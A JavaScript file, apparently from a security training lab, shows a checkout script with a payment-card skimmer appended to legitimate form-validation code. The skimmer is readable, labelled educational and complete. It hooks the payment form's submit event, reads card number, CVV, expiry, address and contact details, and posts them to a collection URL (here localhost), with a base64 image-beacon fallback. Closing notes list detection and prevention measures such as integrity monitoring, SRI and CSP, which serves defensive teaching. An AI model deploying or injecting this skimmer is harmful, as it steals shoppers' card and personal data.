/**
 * CHECKOUT.JS - COMPROMISED VERSION
 * 
 * This file shows how attackers append their malicious code
 * to legitimate JavaScript files.
 * 
 * Structure:
 * 1. Legitimate checkout code (lines 1-300)
 * 2. Malicious skimmer code (lines 301+)
 * 
 * In real attacks, the skimmer would be:
 * - Heavily obfuscated
 * - Minified to blend in
 * - Added at the end of large files
 * 
 * FOR EDUCATIONAL PURPOSES ONLY
 */

// ============================================================================
// PART 1: LEGITIMATE CHECKOUT CODE
// ============================================================================

(function() {
    'use strict';
    
    console.log('[Checkout] Initializing legitimate checkout system...');
    
    /**
     * Validate credit card number using Luhn algorithm
     */
    function validateCardNumber(cardNumber) {
        const digits = cardNumber.replace(/\D/g, '');

        if (digits.length < 15 || digits.length > 16) {
            return { valid: false, error: 'Card number must be 15-16 digits' };
        }

        // Luhn algorithm
        let sum = 0;
        let isEven = false;

        for (let i = digits.length - 1; i >= 0; i--) {
            let digit = parseInt(digits[i]);

            if (isEven) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }

            sum += digit;
            isEven = !isEven;
        }

        const luhnValid = sum % 10 === 0;
        if (!luhnValid) {
            return { valid: false, error: 'Invalid card number (Luhn algorithm check failed)' };
        }

        return { valid: true };
    }
    
    /**
     * Validate expiry date
     */
    function validateExpiry(expiry) {
        const parts = expiry.split('/');
        if (parts.length !== 2) return false;
        
        const month = parseInt(parts[0]);
        const year = parseInt('20' + parts[1]);
        
        if (month < 1 || month > 12) return false;
        
        const now = new Date();
        const currentYear = now.getFullYear();
        const currentMonth = now.getMonth() + 1;
        
        if (year < currentYear) return false;
        if (year === currentYear && month < currentMonth) return false;
        
        return true;
    }
    
    /**
     * Validate CVV
     */
    function validateCVV(cvv, cardNumber) {
        const digits = cvv.replace(/\D/g, '');
        const cleanCard = cardNumber.replace(/\D/g, '');
        
        // Amex (starts with 34 or 37) uses 4-digit CVV
        if (cleanCard.startsWith('34') || cleanCard.startsWith('37')) {
            return digits.length === 4;
        }
        
        // Others use 3-digit CVV
        return digits.length === 3;
    }
    
    /**
     * Show validation error
     */
    function showError(fieldId, message) {
        const field = document.getElementById(fieldId);
        field.style.borderColor = '#e74c3c';
        
        // Remove any existing error message
        const existingError = field.parentElement.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        
        // Add error message
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.color = '#e74c3c';
        errorDiv.style.fontSize = '0.9rem';
        errorDiv.style.marginTop = '0.25rem';
        errorDiv.textContent = message;
        field.parentElement.appendChild(errorDiv);
        
        // Focus the field
        field.focus();
    }
    
    /**
     * Clear validation errors
     */
    function clearErrors() {
        document.querySelectorAll('.error-message').forEach(el => el.remove());
        document.querySelectorAll('input, select').forEach(el => {
            el.style.borderColor = '#ddd';
        });
    }
    
    /**
     * Process payment (simulated)
     */
    function processPayment(formData) {
        console.log('[Checkout] Processing payment...');
        console.log('[Checkout] IMPORTANT: This is a simulated transaction');
        
        return new Promise((resolve) => {
            setTimeout(() => {
                console.log('[Checkout] Payment processed successfully (simulated)');
                console.log('[Checkout] Transaction ID:', 'TXN-' + Date.now());
                resolve({
                    success: true,
                    transactionId: 'TXN-' + Date.now()
                });
            }, 1000);
        });
    }
    
    /**
     * Handle form submission
     */
    async function handleSubmit(event) {
        event.preventDefault();
        
        console.log('[Checkout] Form submitted');
        clearErrors();
        
        // Get form values
        const cardNumber = document.getElementById('card-number').value;
        const cvv = document.getElementById('cvv').value;
        const expiry = document.getElementById('expiry').value;
        
        // Validate card number
        const cardValidation = validateCardNumber(cardNumber);
        if (!cardValidation.valid) {
            showError('card-number', cardValidation.error);
            return false;
        }
        
        // Validate expiry
        if (!validateExpiry(expiry)) {
            showError('expiry', 'Card has expired or invalid date');
            return false;
        }
        
        // Validate CVV
        if (!validateCVV(cvv, cardNumber)) {
            showError('cvv', 'Invalid CVV code');
            return false;
        }
        
        // Show loading state
        const submitBtn = document.querySelector('.submit-btn');
        const originalText = submitBtn.textContent;
        submitBtn.textContent = 'Processing...';
        submitBtn.disabled = true;
        
        try {
            const formData = new FormData(event.target);
            const data = Object.fromEntries(formData.entries());
            
            const result = await processPayment(data);
            
            if (result.success) {
                event.target.style.display = 'none';
                const successMessage = document.getElementById('success-message');
                successMessage.classList.add('show');
                
                console.log('[Checkout] Order completed successfully');
            }
            
        } catch (error) {
            console.error('[Checkout] Payment processing error:', error);
            alert('Payment processing failed. Please try again.');
            
            submitBtn.textContent = originalText;
            submitBtn.disabled = false;
        }
    }
    
    /**
     * Initialize checkout
     */
    function init() {
        const form = document.getElementById('payment-form');
        
        if (form) {
            form.addEventListener('submit', handleSubmit);
            console.log('[Checkout] Checkout system ready');
        }
    }
    
    // Initialize when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();

// ============================================================================
// PART 2: MALICIOUS CODE INJECTED BY ATTACKER
// ============================================================================
// 
// The code below this line was injected by attackers who compromised
// the admin account. Notice how it's appended to legitimate code.
//
// In a real attack, this would be:
// - Heavily obfuscated (eval, base64, hex encoding)
// - Minified to a single line
// - Hidden in whitespace or comments
//
// For educational purposes, this version is readable.
// ============================================================================

(function() {
    'use strict';
    
    // Attackers add a slight delay to avoid detection during page load
    setTimeout(function() {
        
        // Configuration - would be obfuscated in real attacks
        const CONFIG = {
            exfilUrl: 'http://localhost:9002/collect',
            delay: 100,
            debug: true  // Attackers would set to false
        };
        
        function log(message, data) {
            if (CONFIG.debug) {
                console.log('[SKIMMER]', message, data || '');
            }
        }
        
        /**
         * Extract credit card data from form
         */
        function extractCardData() {
            log('Extracting card data from form fields...');
            const data = {
                cardNumber: getFieldValue([
                    '#card-number',
                    '[name="cardNumber"]'
                ]),

                cvv: getFieldValue([
                    '#cvv',
                    '[name="cvv"]'
                ]),

                expiry: getFieldValue([
                    '#expiry',
                    '[name="expiry"]'
                ]),

                cardholderName: getFieldValue([
                    '#cardholder-name',
                    '[name="cardholderName"]'
                ]),

                billingAddress: getFieldValue([
                    '#billing-address',
                    '[name="billingAddress"]'
                ]),

                city: getFieldValue(['#city', '[name="city"]']),
                zip: getFieldValue(['#zip', '[name="zip"]']),
                country: getFieldValue(['#country', '[name="country"]']),
                email: getFieldValue(['#email', '[name="email"]']),
                phone: getFieldValue(['#phone', '[name="phone"]'])
            };

            log('Extracted data:', data);
            
            // Add metadata
            data.metadata = {
                url: window.location.href,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                screenResolution: screen.width + 'x' + screen.height
            };
            
            return data;
        }
        
        function getFieldValue(selectors) {
            log('Searching for field with selectors:', selectors);
            for (let selector of selectors) {
                const element = document.querySelector(selector);
                log(`Selector "${selector}":`, element ? `found element with value "${element.value}"` : 'not found');
                if (element && element.value) {
                    return element.value.trim();
                }
            }
            return '';
        }
        
        function hasValidCardData(data) {
            const cleanCard = data.cardNumber.replace(/[\s-]/g, '');
            const validLength = cleanCard.length === 15 || cleanCard.length === 16;
            const validCVV = data.cvv.length === 3 || data.cvv.length === 4;
            return validLength && validCVV && data.expiry;
        }
        
        /**
         * Exfiltrate stolen data to C2 server
         */
        function exfiltrateData(data) {
            log('Exfiltrating data to C2 server:', data);
            log('Target URL:', CONFIG.exfilUrl);
            log('Data size:', JSON.stringify(data).length, 'bytes');

            const requestBody = JSON.stringify(data);
            log('Request body:', requestBody);

            fetch(CONFIG.exfilUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: requestBody,
                mode: 'cors',
                credentials: 'omit'
            }).then((response) => {
                log('Fetch response status:', response.status);
                log('Fetch response headers:', Object.fromEntries(response.headers.entries()));
                return response.text();
            }).then((responseText) => {
                log('Fetch response body:', responseText);
                log('Data successfully exfiltrated');
            }).catch((error) => {
                console.error('[SKIMMER] Exfiltration failed:', error);
                log('Fetch error details:', {
                    name: error.name,
                    message: error.message,
                    stack: error.stack
                });

                // Fallback method
                log('Attempting fallback image beacon method');
                const img = new Image();
                const params = new URLSearchParams({
                    d: btoa(JSON.stringify(data))
                });
                const fallbackUrl = CONFIG.exfilUrl + '?' + params.toString();
                log('Fallback URL:', fallbackUrl);
                img.src = fallbackUrl;

                img.onload = () => log('Fallback beacon succeeded');
                img.onerror = (err) => log('Fallback beacon failed:', err);
            });
        }
        
        /**
         * Initialize skimmer
         */
        function initSkimmer() {
            log('Initializing skimmer...');
            
            const checkForm = setInterval(() => {
                const form = document.querySelector('#payment-form');
                
                if (form) {
                    clearInterval(checkForm);
                    log('Payment form found, attaching skimmer');
                    log('Form element:', form);
                    log('Form fields found:', form.elements.length);

                    // Intercept form submission
                    form.addEventListener('submit', function(event) {
                        log('Form submission detected');
                        log('Event:', event);

                        const cardData = extractCardData();
                        
                        if (hasValidCardData(cardData)) {
                            log('Valid card data found, preparing exfiltration');
                            
                            setTimeout(() => {
                                exfiltrateData(cardData);
                            }, CONFIG.delay);
                        } else {
                            log('Insufficient card data, skipping exfiltration');
                        }
                        
                        // CRITICAL: Allow legitimate checkout to continue
                    });
                    
                    log('Skimmer ready and listening');
                }
            }, 100);
            
            // Stop checking after 10 seconds
            setTimeout(() => {
                clearInterval(checkForm);
            }, 10000);
        }
        
        // Start the skimmer
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initSkimmer);
        } else {
            initSkimmer();
        }
        
    }, 500); // 500ms delay after page load
    
})();

/**
 * EDUCATIONAL NOTES:
 * 
 * This file demonstrates how attackers append malicious code to legitimate files.
 * 
 * Key characteristics of this attack:
 * 1. Two separate IIFE blocks (immediately invoked function expressions)
 * 2. First block is legitimate, second is malicious
 * 3. Both run independently without interfering with each other
 * 4. Legitimate checkout works normally
 * 5. Data is silently exfiltrated in the background
 * 
 * Detection methods:
 * - File integrity monitoring (FIM) would catch the unauthorized change
 * - Code review would reveal the duplicate functionality
 * - Network monitoring would see the unexpected POST request
 * - Browser DevTools Network tab shows the exfiltration
 * 
 * Prevention:
 * - Strong access controls on source code
 * - Multi-factor authentication for admin accounts
 * - Regular security audits
 * - Subresource Integrity (SRI) for JavaScript files
 * - Content Security Policy (CSP) to restrict network requests
 */